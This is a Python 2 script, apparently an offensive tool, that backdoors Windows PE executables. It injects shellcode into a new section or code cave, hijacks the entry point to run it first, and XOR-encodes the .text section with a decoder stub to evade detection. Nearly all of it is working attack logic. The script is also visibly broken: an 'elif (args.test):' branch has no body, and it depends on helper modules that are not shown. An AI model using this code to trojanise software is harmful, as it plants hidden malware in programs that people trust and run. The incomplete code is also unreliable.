#!/usr/bin/python
# -*- coding: utf-8 -*-
# Credits:
# http://git.n0p.cc/?p=SectionDoubleP.git;a=blob;f=SectionDoubleP.py
# https://msdn.microsoft.com/en-us/library/ms809762.aspx
#
# TODO
#   - Add function to resume execution (not really working at the moment)
#   - Find code cave to put shellcode into
#   - XOR .text and/or .Xdata sections
#   - Fix prologue (for XOR sections)
import sys
import random
import string
import struct
import os
# Required
try: # Kind of check to ensure all modules are installed
    import pefile
    import argparse
    from pwn import disasm, asm
except:
    print "Please install the following modules to ensure %s works" % (sys.argv[0])
    print " - pefile"
    print " - argparse"
    print " - pwn"
    sys.exit(1)

# Import custom modules/functions
from f_generic import *
from f_pe import *

#####################################################
# Functions
#####################################################

### Add shellcode to binary (either into new section or code cave)
def main_inject_shellcode(pe_struct, shellcode, section_name = None, output_file = None, code_cave=False, verbose = False):
    # Get shellcode content
    shellcode, shellcode_size = open_shellcode_file(shellcode)

    if not code_cave:
        print "\n[*] Adding shellcode into new section (technique 1)"
        # Generate a new section name (if not given by user)
        new_section_name = gen_section_name(section_name)
        # Create a new section
        pe_struct, new_section = create_new_section(pe_struct, sectionName=new_section_name)
        # Verbose
        if (args.verbose):
            iterate_trough_pe_sections(pe_struct)

        offset_address = new_section.VirtualAddress

    else: # Add new section
        print "\n[*] Adding shellcode into code cave (technique 2)"
        # Look for code_cave big enough for shellcode
        result_code_cave = find_code_cave(pe_struct, shellcode_size)
        if len(result_code_cave) == 0:
            print "[!] Can't find a code cave where your shellcode may fit (try with technique 1 or use a shorter shellcode).\nExiting..."
            sys.exit(1)
        else:
            # Let user decide which code cave to use
            code_cave_index = user_choice_int("\nWhich code cave do you want to use? ", "[!] Enter valid index please", len(result_code_cave))
            offset_address, section_name = result_code_cave[code_cave_index]
            # Check if section is executable
            if "x" not in get_section_flags(pe_struct, section_name):
                change_section_flags(pe_struct, section_name)

    # Injecting shellcode (new section)
    inject_shellcode(pe_struct, shellcode, offset_address)
    # Update entry point, to jump to our shellcode
    where_2_jmp = offset_address - pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint - 1
    erase_entry_point = b"\xE9" + p(where_2_jmp)
    update_entry_point(pe_struct, where_2_jmp, erase_entry_point)
    # Write PE file
    write_PE_file(pe_struct, output_file)

### XOR a section to "bypass"
def main_xor(pe_struct, add_prologue=False, section_name = None, output_file = None, verbose = False):
    print "\n[*] Entering XOR section(s) function"
    # 1 - Find prologue (few ASM instructions)
    prologue = figure_prologue(pe_struct, verbose)
    # 2 - XOR corresponding section
    xor_section(pe_struct, ".text")
    # 3 - Create new section
    # Generate a new section name (if not given by user)
    new_section_name = gen_section_name(section_name)
    # Create a new section
    pe_struct, latest_section = create_new_section(pe_struct, sectionName=new_section_name)

    # Verbose
    if (verbose):
        iterate_trough_pe_sections(pe_struct)

    # Find size (and index) of a specific section
    section, index = find_section(pe_struct, section_name = ".text")
    diff_end_section = (section.VirtualAddress + section.Misc_VirtualSize) - (pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint)

    # 3 - Create XOR routine
    xor_routine = xor_routine_asm(diff_end_section)
    offset_start = 0

    # 4 - Need to adjust for prologue
    if len(prologue) == 0:
        print "[!] Can't figure out prologue, the program might crash at run time"
    else:
        for opcode, mnemo in prologue:
            if "call" in mnemo:
                print "call"
            elif mnemo in jmp_symbols:
                print "jmp"
            else:
                offset_start += (len(opcode)/2)
                proper_opcode = "\\x" + "\\x".join(opcode[i:i+2] for i in range(0, len(opcode), 2))
                xor_routine += proper_opcode.decode('string-escape')

    # add RET instruction to XOR routine (final step)
    xor_routine += "\x50"                               # PUSH EAX
    xor_routine += "\x31\xc0"                           # XOR EAX, EAX
    xor_routine += "\xc3"                               # RET

    where_2_jmp =  latest_section.VirtualAddress - pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint - ((offset_start - 5) if (offset_start > 0) else 0) - 5

    # Erase previous instructions @EntryPoint
    erase_entry_point = "\x40" * (offset_start - 5) + "\xE8" + p(where_2_jmp)  # relative JMP (use call to push @ on stack)
    # Change code @ entry point
    update_entry_point(pe_struct, where_2_jmp, erase_entry_point)
    # Update code to add XOR routine
    inject_shellcode(pe_struct, xor_routine, latest_section.VirtualAddress)
    # Make section writable
    section.Characteristics = 0xE00000E0

    if (verbose):
        print "\n[*] Check @EntryPoint and @XOR routine"
        display_ASM_instruction(pe_struct, pe_struct.OPTIONAL_HEADER.AddressOfEntryPoint, 30)
        display_ASM_instruction(pe_struct, latest_section.VirtualAddress, len(xor_routine))

    # Write PE file
    write_PE_file(pe_struct, output_file)

#####################################################
# Main
#####################################################
if __name__ == "__main__":
    args = parser()

    # Is verbose ?
    if (args.verbose):
        print "\n[*] Verbose: ON"

    # Load and analyse PE file
    pe_struct = load_pe_file(args.file)
    pe_quick_analysis(pe_struct)

    if (args.analyse): # Look for code cave
        pe_deeper_analysis(pe_struct)
    elif (args.fcc):
        find_code_cave(pe_struct)
    elif (args.xor):
        main_xor(pe_struct, "", args.new_sec_name, args.output, args.verbose)
    elif (args.shellcode):
        main_inject_shellcode(pe_struct, args.shellcode, args.new_sec_name, args.output, args.sh_cc, args.verbose)
    elif (args.test):

    print "\n[*] Finished.\nExiting..."
